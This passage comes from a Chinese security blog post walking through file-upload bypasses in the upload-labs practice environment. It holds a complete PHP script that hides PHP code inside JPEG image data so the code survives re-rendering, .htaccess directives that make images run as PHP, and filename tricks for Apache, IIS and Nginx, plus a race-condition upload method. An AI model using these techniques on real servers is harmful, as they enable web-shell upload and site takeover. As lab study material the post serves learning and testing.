class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs "Something's wrong".</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="string">"&lt;?=phpinfo();?&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, <span class="keyword">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>($dis-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>($dis-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Success!'</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Something\'s wrong'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span><span class="params">($filename, $data, $unlink = FALSE)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $correctImage;</span><br><span class="line">        file_put_contents($filename, $data);</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg($filename);</span><br><span class="line">        <span class="keyword">if</span>($unlink)</span><br><span class="line">            unlink($filename);</span><br><span class="line">        <span class="keyword">return</span> $correctImage;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $extraBytes, $correctImage;</span><br><span class="line">        $correctImage = <span class="keyword">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(\d+) extraneous bytes before marker/'</span>, $errstr, $m)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($m[<span class="number">1</span>])) &#123;</span><br><span class="line">                $extraBytes = (int)$m[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $binData;</span><br><span class="line">        <span class="keyword">private</span> $order;</span><br><span class="line">        <span class="keyword">private</span> $size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename, $order = false, $fromString = false)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = $order;</span><br><span class="line">            <span class="keyword">if</span>(!$fromString) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists($filename) || !is_file($filename))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'File not exists ['</span>.$filename.<span class="string">']'</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents($filename);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = $filename;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span><span class="params">($skip)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, $skip);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $byte = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord($byte);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'End Of File'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $short = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $short = (ord($short[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord($short[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $short;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用方法</p>
<h5 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h5><p>随便找一个jpg图片,先上传至服务器然后再下载到本地保存为<code>1.jpg</code>.</p>
<h5 id="插入php代码"><a href="#插入php代码" class="headerlink" title="插入php代码"></a>插入php代码</h5><p>使用脚本处理<code>1.jpg</code>,命令<code>php jpg_payload.php 1.jpg</code><br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30bb4236-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084055-30bb4236-ab24-1.png" alt="img"></a><br>使用16进制编辑器打开,就可以看到插入的php代码.<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30c860b0-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30c860b0-ab24-1.png" alt="img"></a></p>
<h5 id="上传图片马"><a href="#上传图片马" class="headerlink" title="上传图片马"></a>上传图片马</h5><p>将生成的<code>payload_1.jpg</code>上传.<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30d3a1a0-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30d3a1a0-ab24-1.png" alt="img"></a></p>
<h5 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h5><p>将上传的图片再次下载到本地,使用16进制编辑器打开<br><a href="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30e17b68-ab24-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829084056-30e17b68-ab24-1.png" alt="img"></a></p>
<p>可以看到,php代码没有被去除.<br>证明我们成功上传了含有php代码的图片.</p>
<p>需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.</p>
<h2 id="文件相关信息检测"><a href="#文件相关信息检测" class="headerlink" title="文件相关信息检测"></a>文件相关信息检测</h2><h2 id="文件加载检测"><a href="#文件加载检测" class="headerlink" title="文件加载检测"></a>文件加载检测</h2><h1 id="解析攻击"><a href="#解析攻击" class="headerlink" title="解析攻击"></a>解析攻击</h1><h2 id="直接解析"><a href="#直接解析" class="headerlink" title="直接解析"></a>直接解析</h2><h2 id="本地文件包含解析"><a href="#本地文件包含解析" class="headerlink" title="本地文件包含解析"></a>本地文件包含解析</h2><p><a href="http://127.0.0.1/upload-labs-master/include.php?file=upload/202007291402101138.Php" target="_blank" rel="noopener">http://127.0.0.1/upload-labs-master/include.php?file=upload/202007291402101138.Php</a> 使用文件包含来解析Php</p>
<h2 id="htaccess-解析"><a href="#htaccess-解析" class="headerlink" title=".htaccess 解析"></a>.htaccess 解析</h2><p>使用.htaccess解析上传的jpg</p>
<p>虽然还是黑名单，但几乎过滤了所有有问题的后缀名，除了.htaccess，于是首先上传一个.htaccess内容如下的文件:</p>
<p>![image-20200729111116730](5 文件上传/image-20200729111116730.png)</p>
<p>1.</p>
<p>构造.htaccess文件，内容如下:<code>AddType application/x-httpd-php .jpg</code><br> 这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果</p>
<p>.htaccess文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录，但是很重要的、需要注意的是，其上级目录也可能会有.htaccess文件，而指令是按查找顺序依次生效的，所以一个特定目录下的.htaccess文件中的指令可能会覆盖其上级目录中的.htaccess文件中的指令，即子目录中的指令会覆盖父目录或者主配置文件中的指令。</p>
<p>2..htaccess内容为</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"文件名"</span>&gt;</span><br><span class="line"> SetHandler application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">    </span><br><span class="line">&lt;FilesMatch <span class="string">"1"</span>&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">同目录有个我们上传一个只有文件名并包含字符串<span class="string">"haha"</span>，但是却无任何扩展名的文件</span><br><span class="line">里面的内容是 php 一句话木马</span><br></pre></td></tr></table></figure>



<h2 id="web-应用程序解析漏洞及其原理"><a href="#web-应用程序解析漏洞及其原理" class="headerlink" title="web 应用程序解析漏洞及其原理"></a>web 应用程序解析漏洞及其原理</h2><h3 id="Apache-解析漏洞-（多）"><a href="#Apache-解析漏洞-（多）" class="headerlink" title="Apache 解析漏洞 （多）"></a>Apache 解析漏洞 （多）</h3><p>第十八关</p>
<p>把shell文件名改为shell.php.7z。apache会把它当做php文件进行解析。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.从右向左解析</span><br><span class="line">一个文件名为test.x1.x2.x3的文件，apache会从x3的位置开始尝试解析，如果x3不属于apache能够解析的扩展名，那么apache会尝试去解析x2，直到能够解析到能够解析的为止，否则就会报错。</span><br><span class="line">可将文件名设为shell.php.7z</span><br><span class="line">或者&quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;,  &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,&quot;.tiff&quot;);</span><br><span class="line"></span><br><span class="line">2.00截断</span><br><span class="line">CVE-2017-15715，这个漏洞利用方式就是上传一个文件名最后带有换行符(只能是\x0A，如上传a.php，然后在burp中修改文件名为a.php\x0A)，以此来绕过一些黑名单过滤。</span><br></pre></td></tr></table></figure>

<h3 id="IIS-解析漏洞（少）"><a href="#IIS-解析漏洞（少）" class="headerlink" title="IIS 解析漏洞（少）"></a>IIS 解析漏洞（少）</h3><p>![image-20200728221508691](5 文件上传/image-20200728221508691.png)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IIS6.0在解析asp格式的时候有两个解析漏洞，</span><br><span class="line">目录解析漏洞</span><br><span class="line">一个是如果目录名包含&quot;.asp&quot;字符串，那么这个目录下所有的文件都会按照asp去解析，</span><br><span class="line">文件解析漏洞（分号漏洞）</span><br><span class="line">另一个是只要文件名中含有&quot;.asp;1.jpg&quot;会优先按asp来解析</span><br><span class="line"></span><br><span class="line">IIS7.0&#x2F;7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串&quot;&#x2F;任意文件名.php&quot;就会按照php的方式去解析；</span><br></pre></td></tr></table></figure>

<h3 id="Nginx-解析漏洞（少）"><a href="#Nginx-解析漏洞（少）" class="headerlink" title="Nginx 解析漏洞（少）"></a>Nginx 解析漏洞（少）</h3><p>![image-20200728221951608](5 文件上传/image-20200728221951608.png)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">解析： (任意文件名)&#x2F;(任意文件名).php | (任意文件名)%00.php</span><br><span class="line"></span><br><span class="line">描述：目前Nginx主要有这两种漏洞，一个是对任意文件名，在后面添加&#x2F;任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加为test.jpg&#x2F;x.php进行解析攻击。</span><br><span class="line"></span><br><span class="line">还有一种是对低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。</span><br></pre></td></tr></table></figure>

<h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;       突破点 先把文件上传进去</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">先前是</span><br><span class="line"><span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br></pre></td></tr></table></figure>

<p>![image-20200729193101429](5 文件上传/image-20200729193101429.png)</p>
<p>直接上传1.php木马 intruder之后然后在浏览器不断刷新</p>
<p>![image-20200729192710431](5 文件上传/image-20200729192710431.png)</p>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">zhiliya</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2019/11/23/5%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">http://yoursite.com/2019/11/23/5 文件上传/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="http://yoursite.com">zhiliya的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></span></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#客户端检测绕过-javascript-检测"><span class="toc-number">1.</span> <span class="toc-text">客户端检测绕过(javascript 检测)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#服务端检测绕过-MIME-类型检测"><span class="toc-number">2.</span> <span class="toc-text">服务端检测绕过(MIME 类型检测)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#服务端检测绕过-文件扩展名检测"><span class="toc-number">3.</span> <span class="toc-text">服务端检测绕过(文件扩展名检测)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#黑名单检测"><span class="toc-number">3.1.</span> <span class="toc-text">黑名单检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#大小写绕过-使用文件包含利用"><span class="toc-number">3.1.1.</span> <span class="toc-text">大小写绕过 使用文件包含利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#后缀名中加空格绕过-windows特性-可以"><span class="toc-number">3.1.2.</span> <span class="toc-text">后缀名中加空格绕过  windows特性  可以</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#加”-”绕过-windows特性"><span class="toc-number">3.1.3.</span> <span class="toc-text">加”.”绕过 windows特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#加”-DATA”绕过-Windows流特性绕过"><span class="toc-number">3.1.4.</span> <span class="toc-text">加” ::$DATA”绕过 Windows流特性绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#点空格点绕过-windows特性"><span class="toc-number">3.1.5.</span> <span class="toc-text">点空格点绕过 windows特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#双写绕过"><span class="toc-number">3.1.6.</span> <span class="toc-text">双写绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#白名单检测"><span class="toc-number">3.2.</span> <span class="toc-text">白名单检测</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#00截断"><span class="toc-number">3.2.1.</span> <span class="toc-text">%00截断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#htaccess-文件攻击-容易失败"><span class="toc-number">3.3.</span> <span class="toc-text">.htaccess 文件攻击(容易失败)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#服务端检测绕过-目录路径检测"><span class="toc-number">4.</span> <span class="toc-text">服务端检测绕过(目录路径检测)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#00截断-1"><span class="toc-number">4.1.</span> <span class="toc-text">%00截断</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#服务端检测绕过-文件内容检测"><span class="toc-number">5.</span> <span class="toc-text">服务端检测绕过(文件内容检测)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过检测-lt"><span class="toc-number">5.1.</span> <span class="toc-text">绕过检测&lt;?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件幻数检测-图片马"><span class="toc-number">5.2.</span> <span class="toc-text">文件幻数检测 图片马</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#对比文件的前两个字节-需要使用文件包含漏洞"><span class="toc-number">5.2.1.</span> <span class="toc-text">对比文件的前两个字节 需要使用文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#gif-没包含成功"><span class="toc-number">5.2.1.1.</span> <span class="toc-text">gif 没包含成功</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#png"><span class="toc-number">5.2.1.2.</span> <span class="toc-text">png</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jpeg"><span class="toc-number">5.2.1.3.</span> <span class="toc-text">jpeg</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getimagesize"><span class="toc-number">5.2.2.</span> <span class="toc-text">getimagesize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exif-imagetype函数-未成功"><span class="toc-number">5.2.3.</span> <span class="toc-text">exif_imagetype函数  未成功</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二次渲染-需要使用文件包含漏洞"><span class="toc-number">5.2.4.</span> <span class="toc-text">二次渲染  需要使用文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#gif-成功"><span class="toc-number">5.2.4.1.</span> <span class="toc-text">gif  成功</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#png-1"><span class="toc-number">5.2.4.2.</span> <span class="toc-text">png</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#写入PLTE数据块-失败"><span class="toc-number">5.2.4.2.1.</span> <span class="toc-text">写入PLTE数据块  失败</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#写入IDAT数据块-并不算成功"><span class="toc-number">5.2.4.2.2.</span> <span class="toc-text">写入IDAT数据块 并不算成功</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jpeg-没试成功"><span class="toc-number">5.2.4.3.</span> <span class="toc-text">jpeg 没试成功</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#准备"><span class="toc-number">5.2.4.3.1.</span> <span class="toc-text">准备</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#插入php代码"><span class="toc-number">5.2.4.3.2.</span> <span class="toc-text">插入php代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#上传图片马"><span class="toc-number">5.2.4.3.3.</span> <span class="toc-text">上传图片马</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#验证"><span class="toc-number">5.2.4.3.4.</span> <span class="toc-text">验证</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件相关信息检测"><span class="toc-number">5.3.</span> <span class="toc-text">文件相关信息检测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件加载检测"><span class="toc-number">5.4.</span> <span class="toc-text">文件加载检测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#解析攻击"><span class="toc-number">6.</span> <span class="toc-text">解析攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#直接解析"><span class="toc-number">6.1.</span> <span class="toc-text">直接解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地文件包含解析"><span class="toc-number">6.2.</span> <span 